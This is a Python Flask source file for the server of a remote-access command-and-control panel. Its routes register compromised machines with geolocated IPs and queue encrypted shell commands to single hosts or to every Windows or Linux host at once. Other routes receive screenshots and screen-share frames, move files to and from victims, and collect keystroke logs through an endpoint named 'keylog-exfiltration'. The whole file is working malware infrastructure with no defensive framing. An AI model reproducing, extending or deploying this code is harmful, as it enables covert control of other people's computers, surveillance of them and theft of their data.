import os
from flask import Flask, redirect, url_for, render_template, request, jsonify, make_response, send_file, Response, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import bcrypt
import jwt
import datetime
from datetime import timedelta
from functools import wraps
from dotenv import load_dotenv
import random
import string
import requests
import json
from flask_socketio import SocketIO, emit
from threading import Lock
import time
from Crypto.PublicKey import RSA  # Import PyCryptodome's RSA module for key generation
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
import base64
import ast
import threading

# Load environment variables
load_dotenv(override=True)
SECRET_KEY = os.getenv('JWT_SECRET_KEY')
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Global variables
command_to_execute = {}
thread = None
thread_lock = Lock()
active_clients = {}
original_server_file_path_for_file_to_send_to_client=""
app = Flask(__name__)

# Global variables and constants for screen share
SCREENSHARE_SCREENSHOT_PATH = "static/"
client_specific_screenshare_screnshot_path = ""

socketio = SocketIO(app, cors_allowed_origins="*", ssl_context=('cert.pem', 'key.pem'))


# Configure the instance folder
app.config['SECRET_KEY'] = SECRET_KEY
app.config['INSTANCE_PATH'] = os.path.join(os.getcwd(), 'instance')  # Set path for instance folder
os.makedirs(app.config['INSTANCE_PATH'], exist_ok=True)  # Ensure instance folder exists

# Path to your admin.db file inside the instance directory
DATABASE_URI = 'sqlite:///' + os.path.join(app.config['INSTANCE_PATH'], 'admin.db')

# Configure the database URI
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URI
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Define a model for the admin table
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    codename = db.Column(db.String(80), unique=True, nullable=False)
    secret = db.Column(db.String(200), nullable=False)
    role = db.Column(db.String(80), nullable=False)

    def __repr__(self):
        return f"<Admin {self.codename}>"
# Client Data Table
class ClientData(db.Model):
    client_id = db.Column(db.String(64), primary_key=True)  # Unique client ID
    user = db.Column(db.String(128), nullable=False)
    nickname = db.Column(db.String(128), nullable=False)
    ip = db.Column(db.String(64), nullable=False)
    os = db.Column(db.String(128), nullable=False)
    registered_at = db.Column(db.DateTime)  # Registration timestamp
    last_active = db.Column(db.DateTime)  # Last active timestamp
    address = db.Column(db.String(128), nullable=False)

    def __repr__(self):
        return f"<ClientData {self.client_id}>"

# Commands Log Table
class CommandsLog(db.Model):
    log_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client_data.client_id'), nullable=False)
    command_initiator = db.Column(db.String(128), nullable=False)
    commands_history = db.Column(db.Text)  # JSON or serialized text
    client = db.relationship('ClientData', backref=db.backref('commands_logs', lazy=True))

    def __repr__(self):
        return f"<CommandsLog {self.log_id} for {self.client_id}>"

# Cryptography Data Table (for AES 256-bit keys)
class CryptographyData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), db.ForeignKey('client_data.client_id'), nullable=False)
    aes_key = db.Column(db.LargeBinary, nullable=False)  # Store AES 256-bit key as binary

    client = db.relationship('ClientData', backref=db.backref('cryptography_data', lazy=True))

    def __repr__(self):
        return f"<CryptographyData {self.client_id}>"
    
command_to_execute = {}
execution_result = {}

def create_database():
    """Check if admin.db exists in the instance folder. If not, create it and add a default admin."""
    admin_db_path = os.path.join(app.config['INSTANCE_PATH'], 'admin.db')
    if not os.path.exists(admin_db_path):
        print("Database file does not exist. Creating it now...")

        # Create the database and tables within an app context
        with app.app_context():
            db.create_all()
            secret = "secret"
            byte = secret.encode('utf-8')
            salt = bcrypt.gensalt()
            hash = bcrypt.hashpw(byte, salt)  # Do not decode to string, keep it as bytes
            # Add a default admin user
            default_admin = Admin(codename="admin", secret=hash, role="superadmin")
            
            db.session.add(default_admin)
            db.session.commit()
            print("Default admin added to the database.")
    else:
        print("Database already exists. No changes made.")
# Create the database (this call needs to be inside the app context)
create_database()



def generate_jwt(role,codename):
    """Generate a JWT for a given user role."""
    header = {
        'alg': 'HS256',  # Algorithm used to sign the token
        'typ': 'JWT'     # Type of the token
    }

    payload = {
        'user': {
            'role': role,
            'codename': codename
        },
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),  # Token expires in 1 hour
        'iat': datetime.datetime.utcnow()  # Issued at time
    }

    return jwt.encode(payload, SECRET_KEY, algorithm='HS256', headers=header)




def validate_jwt(token):
    """Validate a JWT token."""
    try:
        decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return decoded_token
    except jwt.ExpiredSignatureError:
        # print("Token has expired")
        return None
    except jwt.InvalidTokenError:
        print("Invalid token")
        return None


def token_required(f):
    """Decorator to enforce JWT authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('token')  # Get the token from cookies
        if not token:
            return redirect(url_for('login'))  # No token, redirect to login
        decoded_token = validate_jwt(token)
        if not decoded_token:
            return redirect(url_for('login'))  # Inavlid or expired token, redirect to login
        return f(decoded_token, *args, **kwargs)
    return decorated_function




@app.route("/")
def home():
    return redirect(url_for('login'))



@app.route("/dashboard/")
def to_dashbaord():
    return redirect(url_for('dashboard'))

@app.route("/login")
def login():
    return render_template("login.html")



@app.route("/dashboard")
@token_required
def dashboard(decoded_token):
    role = decoded_token['user']['role']
    return render_template("dashboard.html", role=role)


# Function to generate a random UUID with 6 characters
def generate_client_id():
    random_uuid = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    timestamp = datetime.datetime.now()
    timestampForClientID = timestamp.strftime('%Y%m%d%H%M%S')
    return f"{random_uuid}-{timestampForClientID}"


def get_address(ip):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        city = data.get("city", "N/A")
        region = data.get("region", "N/A")
        country = data.get("country", "N/A")
        return f"{city} - {region} - {country}"
    
    return "Unable to fetch location"


# Sample route for client registration
@app.route('/api/clientRegistration', methods=['POST'])
def client_registration():
    data = request.get_json()
    print(data)
    # Extract client details from request
    user = data.get('user')
    ip = data.get('public_ip')
    os_name = data.get('os')

    # Generate a unique client_id (random 6 characters + timestamp)
    client_id = generate_client_id()

    # Calculate the registration date (current UTC time)
    reg_date = datetime.datetime.now()

    # Save the new client data to the database
    new_client = ClientData(
        client_id=client_id,
        user=user,
        nickname="nickname",
        ip=ip,
        os=os_name,
        registered_at=reg_date,
        last_active=reg_date,
        address=get_address(ip)
    )

    try:
        # Add the new client to the session and commit it to the database
        db.session.add(new_client)
        db.session.commit()
        print(f"New client registered: {client_id}, User: {user}, IP: {ip}, OS: {os_name}, Registered at: {reg_date}")
        load_dotenv(override=True)
        # Check environment variables for public and private keys
        public_key = os.getenv('PUBLIC_KEY_FOR_AES_KEY_EXCHANGE')
        private_key = os.getenv('PRIVATE_KEY_FOR_AES_KEY_EXCHANGE')
        print("Public key: ",public_key)
        print("Private key: ", private_key)
        if public_key and private_key:
            # Both keys exist in .env, use the public key directly
            print("Using existing RSA keys from .env")
        else:
            # One or both keys are missing, generate a new RSA key pair
            print("Generating new RSA key pair...")
            rsa_key = RSA.generate(2048)  # Generate 2048-bit RSA key pair
            public_key = rsa_key.publickey().exportKey('PEM').decode('utf-8')  # Export public key as PEM string
            private_key = rsa_key.exportKey('PEM').decode('utf-8')  # Export private key as PEM string

            # Append the new keys to the .env file
            env_file_path = os.path.join(BASE_DIR, '.env')
            try:
                with open(env_file_path, 'a') as env_file:
                    env_file.write(f'\nPUBLIC_KEY_FOR_AES_KEY_EXCHANGE="{public_key}"\n')
                    env_file.write(f'PRIVATE_KEY_FOR_AES_KEY_EXCHANGE="{private_key}"\n')
                print("New RSA keys appended to .env file.")
                
                # Reload environment variables to reflect the new keys
                load_dotenv(override=True)  # Reload .env to update os.getenv() values
                public_key = os.getenv('PUBLIC_KEY_FOR_AES_KEY_EXCHANGE')
                print("Created new public key: ", public_key)
                private_key = os.getenv('PRIVATE_KEY_FOR_AES_KEY_EXCHANGE')
            except Exception as e:
                print(f"Error writing to .env file: {e}")
                return jsonify({"error": "Server configuration error: Unable to save RSA keys."}), 500

        # Return the client_id, registration date, and public key as a response
        return jsonify({
            "client_id": client_id,
            "reg_date": reg_date.strftime('%Y-%m-%d %H:%M:%S'),
            "public_key": public_key
        }), 201

    except Exception as e:
        db.session.rollback()  # Rollback the session in case of error
        print(f"Error saving client data: {e}")
        return jsonify({"error": "An error occurred while registering the client."}), 500

@app.route('/api/aes-share', methods=['POST'])
def aes_share():
    print("Entering /api/aes-share endpoint")
    data = request.get_json()
    print(f"Received data: {data}")

    encrypted_payload_hex = data.get('encrypted_payload')
    if not encrypted_payload_hex:
        print("Error: Missing encrypted_payload in request")
        return jsonify({"error": "Missing encrypted_payload"}), 400

    try:
        print("Converting encrypted payload from hex to bytes")
        encrypted_payload = bytes.fromhex(encrypted_payload_hex)

        print("Loading RSA private key from environment")
        private_key_pem = os.getenv('PRIVATE_KEY_FOR_AES_KEY_EXCHANGE')
        if not private_key_pem:
            print("Error: RSA private key not found in .env")
            return jsonify({"error": "Server configuration error: Private key missing"}), 500

        print("Importing RSA private key")
        private_key = RSA.import_key(private_key_pem)

        print("Decrypting payload with RSA private key")
        cipher_rsa = PKCS1_OAEP.new(private_key)
        decrypted_payload_bytes = cipher_rsa.decrypt(encrypted_payload)
        decrypted_payload_json = decrypted_payload_bytes.decode('utf-8')
        print(f"Decrypted payload (JSON): {decrypted_payload_json}")

        payload = json.loads(decrypted_payload_json)
        client_id = payload.get('client_id')
        aes_key_hex = payload.get('aes_key')
        if not client_id or not aes_key_hex:
            print("Error: Missing client_id or aes_key in decrypted payload")
            return jsonify({"error": "Invalid payload format"}), 400

        print("Converting AES key from hex to bytes")
        aes_key = bytes.fromhex(aes_key_hex)
        print(f"Decrypted AES key (first 10 bytes): {aes_key[:10].hex()}...")

        # Check if the AES key for the client_id already exists in the database
        crypto_entry = CryptographyData.query.filter_by(client_id=client_id).first()

        if crypto_entry:
            # If the AES key exists for the client, update it
            print(f"Found existing AES key for client_id: {client_id}. Updating the AES key.")
            crypto_entry.aes_key = aes_key
        else:
            # If no entry is found, create a new one
            print(f"No AES key found for client_id: {client_id}. Adding a new entry.")
            crypto_entry = CryptographyData(client_id=client_id, aes_key=aes_key)
            db.session.add(crypto_entry)

        print("Committing database session")
        db.session.commit()
        print(f"AES key successfully updated/added for client_id: {client_id}")

        return jsonify({"status": "Encrypted payload received and AES key stored"}), 200

    except ValueError as e:
        print(f"Error: Invalid encrypted payload format - {e}")
        return jsonify({"error": "Invalid encrypted payload format"}), 400
    except Exception as e:
        print(f"Error in aes_share: {e}")
        db.session.rollback()
        return jsonify({"error": "Failed to process encrypted payload"}), 500

def encrypt_data(aes_key, data):
    """
    Encrypt data (text or file) using AES-GCM with the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        data (str or bytes): The data to encrypt (string for text, bytes for files).
    
    Returns:
        dict: Dictionary with nonce, ciphertext, and tag (all hex-encoded), or None if failed.
    """
    try:
        print("[INFO] Starting encryption process...")

        # Convert input to bytes
        if isinstance(data, str):
            print("[INFO] Data is a string. Encoding to bytes.")
            data_bytes = data.encode('utf-8')
        elif isinstance(data, bytes):
            print("[INFO] Data is already in bytes.")
            data_bytes = data
        else:
            raise ValueError("Data must be string or bytes")

        # Generate a 12-byte nonce for AES-GCM
        nonce = get_random_bytes(12)
        print(f"[INFO] Generated nonce: {nonce.hex()}")

        # Create AES-GCM cipher and encrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data_bytes)

        print("[INFO] Data encryption successful.")
        
        # Return hex-encoded values for JSON compatibility
        encrypted_command_data = {
            "nonce": nonce.hex(),
            "ciphertext": ciphertext.hex(),
            "tag": tag.hex()
        }
        return base64.b64encode(json.dumps(encrypted_command_data).encode('utf-8')).decode('utf-8')

    except Exception as e:
        print(f"[ERROR] Error in encrypt_data: {e}")
        return None



def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
    """
    Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        nonce_hex (str): The hex-encoded nonce from encryption.
        ciphertext_hex (str): The hex-encoded ciphertext from encryption.
        tag_hex (str): The hex-encoded authentication tag from encryption.
    
    Returns:
        bytes: Decrypted data (bytes, caller can decode to string for text), or None if failed.
    """
    try:
        # Convert hex strings to bytes
        nonce = bytes.fromhex(nonce_hex)
        ciphertext = bytes.fromhex(ciphertext_hex)
        tag = bytes.fromhex(tag_hex)

        # Create AES-GCM cipher and decrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)

        return plaintext_bytes
    except Exception as e:
        print(f"Error in decrypt_data: {e}")
        return None
    
def get_aes_key_by_client_id(client_id):
    crypto_data = CryptographyData.query.filter_by(client_id=client_id).first()
    if crypto_data:
        return bytes(crypto_data.aes_key)  # Ensure it's in bytes
    return None

command_initiator = ""
@app.route('/input-command-to-execute-from-web', methods=['POST'])
@token_required
def execute_command(decoded_token):
    global command_initiator
    command_initiator = decoded_token['user']['codename']
    command_json = request.get_json()
    if command_json["command"] and command_json["clientid"]:
        client_in_database = ClientData.query.filter_by(client_id=command_json["clientid"]).first()
        if not client_in_database:
            return jsonify({"error": "Client is not found in database"})
        try:
            if datetime.datetime.utcnow() - client_in_database.last_active > timedelta(seconds=8):
                return jsonify({"status": "Failed! Client inactive. Command queued for execution on reactivation."})
        except Exception as e:
            print(e)
        command_to_execute[command_json["clientid"]] = command_json["command"]
        print(command_to_execute)
        print(f"Received command: {command_json["command"]}")  # Log the received command in the terminal
        return jsonify({"status": "Command sent to the server and queued for client transmission successfully."})
    return jsonify({"status": "No command received"})



def update_last_active_time(client):
    if client:
        client.last_active = datetime.datetime.now()  # Directly updating last_active field
        db.session.commit()
        return jsonify({"status": "updated"}), 200
    return jsonify({"error": "Client not found"}), 404
is_multicast_received = False


multicast_commands = {
    "Linux": {"command": None, "timestamp": None},
    "Windows": {"command": None, "timestamp": None}
}

@app.route('/api/command-multicast', methods=["POST"])
def command_multicast(): 
    command_json = request.get_json()
    platform = command_json.get("platform")
    command = command_json.get("command")

    if not platform or not command:
        return jsonify({"status": "Failed, either platform or command missing"})

    if platform in multicast_commands:
        multicast_commands[platform] = {
            "command": command,
            "timestamp": datetime.datetime.now()
        }
        # Automatically clear command after 5 seconds
        threading.Timer(5, lambda: multicast_commands.update({platform: {"command": None, "timestamp": None}})).start()
        return jsonify({"success": f"Command stored for {platform}"})
    else:
        return jsonify({"failed": "Failed, unsupported platform"})




@app.route('/command-transmission-to-client', methods=['GET'])
def receive_command():
    client_id = request.args.get('clientID')
    if not client_id:
        return jsonify({"error": "clientID is required"}), 400

    client_in_database = ClientData.query.filter_by(client_id=client_id).first()
    if not client_in_database:
        return jsonify({"error": "Client is not found in database"})

    update_last_active_time(client_in_database)

    os_name = client_in_database.os
    multicast_command = multicast_commands.get(os_name, {}).get("command")
    timestamp = multicast_commands.get(os_name, {}).get("timestamp")

    # Check if the multicast command is within the 5-second window
    if multicast_command and timestamp and (datetime.datetime.now() - timestamp) <= timedelta(seconds=5):
        command_to_execute[client_id] = multicast_command

    if client_id in command_to_execute:
        command = command_to_execute.pop(client_id)
        command_to_encrypt = {"command": command}
        return encrypt_data(get_aes_key_by_client_id(client_id), f"{command_to_encrypt}")

    return jsonify({"command": None})


UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/api/screenshot", methods=["POST"])
def save_screenshot():





    client_id = request.form.get('client_id')
    if not client_id:
        return jsonify({"error": "client_id is required"}), 400

    # Get the uploaded file
    if 'file' not in request.files:
        return jsonify({"error": "No file part in request"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    # Read the encrypted data (JSON bytes)
    encrypted_bytes = file.read()
    encrypted_data = json.loads(encrypted_bytes.decode('utf-8'))

    # Extract nonce, ciphertext, tag
    nonce_hex = encrypted_data['nonce']
    ciphertext_hex = encrypted_data['ciphertext']
    tag_hex = encrypted_data['tag']
    
    decrypted_bytes = decrypt_data(get_aes_key_by_client_id(client_id), nonce_hex, ciphertext_hex, tag_hex)

    # Generate a timestamp
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")  # Format: YYYYMMDD_HHMMSS

    # Create the filename with client_id and timestamp
    filename = f"{client_id}-{timestamp}.png"
    file_path = os.path.join(UPLOAD_FOLDER, filename)

    if decrypted_bytes:
        with open(file_path, 'wb') as f:
            f.write(decrypted_bytes)
        print(f"Decrypted screenshot saved to {file_path}")
        return jsonify({
            "status": "success"
        }), 200
    else:
        return jsonify({
            "status": "failed"
        }), 400

@app.route('/api/download-files-from-client', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file part'

    file = request.files['file']
    if file.filename == '':
        return 'No selected file'
    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return f'File uploaded successfully: {file.filename}'



@app.route('/api/uploadFromFiles', methods=['POST'])
def upload_from_files():
    client_id = request.form.get('client_id')
    
    if not client_id:
        return jsonify({"success": False, "message": "Client ID is required."}), 400
    client_in_database = ClientData.query.filter_by(client_id=client_id).first
    if 'files' not in request.files:
        return jsonify({"success": False, "message": "No file part."}), 400
    print(request.files)
    files = request.files.getlist('files')

    if len(files) == 0:
        return jsonify({"success": False, "message": "No files selected."}), 400

    saved_files = []
    for file in files:
        if file.filename == '':
            continue
        
        upload_path = os.path.join(UPLOAD_FOLDER, "FILES_TO_SEND_TO_CLIENT")
        os.makedirs(upload_path, exist_ok=True)
        file_path = os.path.join(upload_path, f"{client_id}-{file.filename}")
        file.save(file_path)
        command_to_execute[client_id] = json.dumps({
            "upload_type": "UploadFromFiles",
            "client_id": client_id,
            "filename": file.filename
        })
        print(command_to_execute)

        saved_files.append(file.filename)

    if len(saved_files) == 0:
        return jsonify({"success": False, "message": "No valid files to save."}), 400

    return jsonify({
        "success": True,
        "message": f"File successfully uploaded to server to send to client {client_id}.",
        "files": saved_files
    })


@app.route('/api/uploadFromServer', methods=['POST'])
def upload_from_server():
    global original_server_file_path_for_file_to_send_to_client
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        original_server_file_path_for_file_to_send_to_client = data.get('file_path')
        print(original_server_file_path_for_file_to_send_to_client)
        if not client_id or not original_server_file_path_for_file_to_send_to_client:
            return jsonify({"success": False, "message": "Client ID and file path are required."}), 400

        # Assuming the file exists at the provided file_path
        if not os.path.exists(original_server_file_path_for_file_to_send_to_client):
            return jsonify({"success": False, "message": "File path does not exist."}), 400

        # Create a command object with the full file path
        command = {
            "command": "UploadFromServer",
            "client_id": client_id,
            "server_file_path": original_server_file_path_for_file_to_send_to_client  # Using the full file path here
        }
        print("aaaaaaaaa",command)
        # Store the command in the command_to_execute variable (acting as in-memory storage)
        command_to_execute[client_id] = json.dumps(command)

        # Returning the response with the command object
        return jsonify({"success": True, "command": command})

    except Exception as e:
        print(e)
        return jsonify({"success": False, "message": "An error occurred while processing the request."}), 500



@app.route("/api/upload-file-to-client", methods=["GET"])
def upload_file_to_client():
    global original_server_file_path_for_file_to_send_to_client

    def encrypt_and_return_file(client_id,final_file_path_to_send):
        with open(final_file_path_to_send, 'rb') as file:
            file_data = file.read()
            encrypted_data = encrypt_data(get_aes_key_by_client_id(client_id), file_data)
            if encrypted_data:
                print("[INFOxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx] File encryption successful.")
                return encrypted_data

    try:
        # Extract client_id and filename from request parameters
        client_id = request.args.get("clientID")
        filename = request.args.get("filename")
        server_file_path_from_client = request.args.get("server_file_path_from_client")
        if not client_id:
            return jsonify({"error": "Missing clientID"}), 400
        if filename and server_file_path_from_client:
            return jsonify({"error": "Invalid request! Cannot contain filename and server's path"}), 400
        if filename and not server_file_path_from_client:
            # Construct the full filename
            full_filename = f"{client_id}-{filename}"
            print(full_filename)
            file_path = os.path.join(BASE_DIR,"uploads/FILES_TO_SEND_TO_CLIENT", full_filename)
            print(file_path)
            # Check if file exists
            if os.path.exists(file_path):
                return encrypt_and_return_file(client_id,file_path)
            else:
                return jsonify({"error": "File not found"}), 404
            
        elif  server_file_path_from_client and not filename:
            if server_file_path_from_client == original_server_file_path_for_file_to_send_to_client:
                if os.path.exists(server_file_path_from_client):
                    return encrypt_and_return_file(client_id,server_file_path_from_client)
                else:
                    return jsonify({"success": False, "message": "File path does not exist."}), 400
            else:
                return jsonify({"error": "File path is not from client is not matched as per command"}), 400


    except Exception as e:
        return jsonify({"error": str(e)}), 500


def background_thread():
    while True:
        with app.app_context():  # Ensure we have an active application context
            try:
            
                clients = ClientData.query.all()  # Fetch all clients
                threshold_time = datetime.datetime.now() - timedelta(seconds=12)  # Set the threshold for recent activity

                live_clients = [
                    {
                        "client_id": client.client_id,
                        "user": client.user,
                        "nickname": client.nickname,
                        "os": client.os,
                        "ip": client.ip,
                        "registered_at": str(client.registered_at),
                        "last_active": str(client.last_active),
                        "address": client.address

                    }
                    for client in clients if client.last_active and client.last_active >= threshold_time
                ]
                all_clients = [
                    {
                        "client_id": client.client_id,
                        "user": client.user,
                        "nickname": client.nickname,
                        "os": client.os,
                        "ip": client.ip,
                        "registered_at": str(client.registered_at),
                        "last_active": str(client.last_active),
                        "address": client.address

                    }
                    for client in clients
                ]
                socketio.emit('all_client_list', {
                        "type": "full_update",
                        "clients": all_clients
                    })
                socketio.emit('live_client_list', {
                        "type": "full_update",
                        "clients": live_clients
                    })
                socketio.sleep(3)

            except Exception as e:
                    print(f"Error in background thread: {e}")

@socketio.on('connect')
def handle_connect():
    global thread
    with thread_lock:
        if thread is None:
            thread = socketio.start_background_task(background_thread)



def add_command_log(client_id, command_initiator, command, result):
    # Prepare command history in JSON format
    command_entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "command": command,
        "result": result
    }
    
    command_history_json = json.dumps(command_entry)
    
    # Create a new CommandsLog entry
    new_log = CommandsLog(
        client_id=client_id,
        command_initiator=command_initiator,
        commands_history=command_history_json
    )
    
    # Add to database session and commit
    db.session.add(new_log)
    db.session.commit()

@app.route('/execution-result-of-command-from-client', methods=['POST'])
def receive_result():
    global command_initiator
    try:
        client_id = request.args.get('clientID')
        encrypted_and_base64_encoded_result_data = request.data
        aes_key = get_aes_key_by_client_id(client_id)
        encrypted_result_data_string = base64.b64decode(encrypted_and_base64_encoded_result_data).decode()
        encrypted_result_data_json = json.loads(encrypted_result_data_string)
        nonce_hex = encrypted_result_data_json.get("nonce")
        ciphertext_hex = encrypted_result_data_json.get("ciphertext")
        tag_hex = encrypted_result_data_json.get("tag")
        decrypted_result = (decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex)).decode()
        print(decrypted_result)
        decrypted_result_json = ast.literal_eval(decrypted_result)


        if "result" not in decrypted_result_json or "client_id" not in decrypted_result_json or "command" not in decrypted_result_json:
            return jsonify({"error": "Missing required fields"}), 400
        add_command_log(decrypted_result_json["client_id"], command_initiator, decrypted_result_json["command"], decrypted_result_json["result"])
        # Emit WebSocket message instead of storing in global var
        socketio.emit('command_result', {
            "client_id": decrypted_result_json["client_id"],
            "result": decrypted_result_json["result"],
            "command": decrypted_result_json["command"]
        })
        
        return jsonify({"status": "Result received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

keylog_directory = "KEYLOG_DIR"
os.makedirs(keylog_directory, exist_ok=True)

@app.route('/api/keylog-exfiltration', methods=['POST'])
def keylog_exfiltration():
    payload = request.form.get('payload')
    if payload:
        decoded_keylog_data = base64.b64decode(payload).decode()
        decoded_keylog_data_in_json = json.loads(decoded_keylog_data)
        client_id = decoded_keylog_data_in_json.get("clientid")
        payload = decoded_keylog_data_in_json.get("data")
        aes_key = get_aes_key_by_client_id(client_id)
        decoded_payload = base64.b64decode(payload).decode()
        decoded_payload_in_json = json.loads(decoded_payload)
        nonce_hex = decoded_payload_in_json.get("nonce")
        ciphertext_hex = decoded_payload_in_json.get("ciphertext")
        tag_hex = decoded_payload_in_json.get("tag")
        decrypted_keylog_data = decrypt_data(aes_key,nonce_hex,ciphertext_hex,tag_hex).decode()
        file_path = os.path.join(keylog_directory, f"{client_id}-keylog.txt")
        with open(file_path, "a") as file:
            file.write(decrypted_keylog_data)


        return 'Payload received', 200
    else:
        return 'No payload provided', 400


@app.route("/super-admin-panel")
@token_required
def super_admin_panel(decoded_token):
    # Check if the decoded token contains a superadmin role
    if decoded_token['user']['role'] == 'superadmin':
        return render_template("superAdminPanel.html")  # Render super admin panel
    else:
        return jsonify({"error": "Access forbidden"}), 403  # Return an error if not a superadmin


@app.route('/api/getAllAdmins', methods=['GET'])
@token_required
def get_all_admins(decoded_token):
    if decoded_token['user']['role'] == 'superadmin':
        try:
            admins = Admin.query.filter(Admin.codename != 'admin').all()
            admins_list = [
                {
                    'id': admin.id,
                    'codename': admin.codename,
                    'role': admin.role,
                }
                for admin in admins
            ]
            return jsonify({'status': 'success', 'admins': admins_list}), 200
        except Exception as e:
            return jsonify({'status': 'error', 'message': str(e)}), 500
    else:
            return jsonify({"error": "Access forbidden"}), 403  # Return an error if not a superadmin


@app.route('/api/clients', methods=['GET'])
@token_required
def get_clients(decoded_token):
    try:
        clients = ClientData.query.with_entities(ClientData.client_id).all()
        client_list = [client.client_id for client in clients]
        return jsonify(client_list), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Initiator endpoint - returns all admin codenames from Admin table
@app.route('/api/initiators', methods=['GET'])
@token_required
def get_initiators(decoded_token):
    try:
        admins = Admin.query.with_entities(Admin.codename).all()
        initiator_list = [admin.codename for admin in admins]
        return jsonify(initiator_list), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def get_directory_listing(subpath=""):
    """Safely list directory contents while preventing path traversal."""
    # Construct the full path
    full_path = os.path.join(UPLOAD_FOLDER, subpath)

    # Convert to absolute paths for security check
    abs_upload_folder = os.path.abspath(UPLOAD_FOLDER)
    abs_full_path = os.path.abspath(full_path)

    # Prevent directory traversal
    if not abs_full_path.startswith(abs_upload_folder):
        return None

    if not os.path.isdir(abs_full_path):
        return None

    # List directory contents
    files = []
    dirs = []
    for item in os.listdir(abs_full_path):
        item_path = os.path.join(abs_full_path, item)
        if os.path.isdir(item_path):
            dirs.append(item)
        elif os.path.isfile(item_path):
            files.append(item)

    return {"path": subpath, "dirs": dirs, "files": files}

@app.route('/api/uploads/', defaults={'subpath': ''})
@app.route('/api/uploads/<path:subpath>')
def list_directory(subpath):
    """Return directory listing as JSON."""
    directory_listing = get_directory_listing(subpath)
    if directory_listing is None:
        abort(403)  # Access denied or not a directory
    return jsonify(directory_listing)

@app.route('/download/<path:filename>')
def download_file(filename):
    """Serve files for download or redirect to directory listing."""
    safe_path = os.path.join(UPLOAD_FOLDER, filename)

    # Convert to absolute paths for security check
    abs_upload_folder = os.path.abspath(UPLOAD_FOLDER)
    abs_safe_path = os.path.abspath(safe_path)

    # Prevent directory traversal
    if not abs_safe_path.startswith(abs_upload_folder):
        abort(403)  # Access denied

    if os.path.isdir(abs_safe_path):
        # Redirect to directory listing if it's a directory
        return redirect(f"/#/{filename}")
    
    if not os.path.isfile(abs_safe_path):
        abort(404)  # File not found

    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route('/logs/')
@token_required
def logs_page(decoded_token):
    """Serve the logs dashboard page."""
    return render_template('logs.html')

@app.route('/api/logs', methods=['GET'])
@token_required
def get_logs(decoded_token):
    """Retrieve and filter logs from the database."""
    # Get query parameters
    client_id = request.args.get('client_id')
    initiator = request.args.get('initiator')
    start_time = request.args.get('start_time')  # Expected in ISO format, e.g., "2025-03-09T00:00:00"
    end_time = request.args.get('end_time')      # Expected in ISO format, e.g., "2025-03-09T23:59:59"

    # Build the base query
    query = CommandsLog.query

    # Apply filters if provided
    if client_id:
        query = query.filter_by(client_id=client_id)
    if initiator:
        query = query.filter_by(command_initiator=initiator)

    # Fetch all matching logs
    logs = query.all()

    # Filter logs by timestamp in the application layer
    filtered_logs = []
    for log in logs:
        try:
            # Parse the commands_history JSON
            history = json.loads(log.commands_history)
            timestamp_str = history.get('timestamp')
            if not timestamp_str:
                continue

            # Convert timestamp string to datetime object
            timestamp = datetime.datetime.fromisoformat(timestamp_str)

            # Check if timestamp falls within the provided range
            if (not start_time or timestamp >= datetime.datetime.fromisoformat(start_time)) and \
               (not end_time or timestamp <= datetime.datetime.fromisoformat(end_time)):
                filtered_logs.append({
                    'log_id': log.log_id,
                    'client_id': log.client_id,
                    'command_initiator': log.command_initiator,
                    'timestamp': timestamp_str,
                    'command': history.get('command'),
                    'result': history.get('result')
                })
        except (json.JSONDecodeError, ValueError):
            # Skip entries with invalid JSON or timestamp formats
            continue

    # Return the filtered logs as JSON
    return jsonify(filtered_logs)

@app.route('/screenshare')
def screenshare():
    return render_template('screenshare.html')

@app.route('/api/screenshare', methods=['POST'])
def upload_screenshot():
    try:
        if 'screenshot' not in request.files:
            print("No screenshot uploaded")
            return Response("No screenshot uploaded", status=400)
        client_id = request.args.get('clientId')
        if not client_id:
            return jsonify({"error": "clientID is required"}), 400

        client_in_database = ClientData.query.filter_by(client_id=client_id).first()
        if not client_in_database:
            return jsonify({"error": "Client is not found in database"})
        screenshot = request.files['screenshot']
        if screenshot.filename == '':
            print("Empty filename received")
            return Response("Empty filename", status=400)
        client_specific_screenshare_screnshot_path = f"{SCREENSHARE_SCREENSHOT_PATH}{client_id}-latestscreenshot.png"
        screenshot.save(client_specific_screenshare_screnshot_path)
        print(f"Screenshot saved to {client_specific_screenshare_screnshot_path} at {time.ctime()}")
        return Response("Screenshot received", status=200)
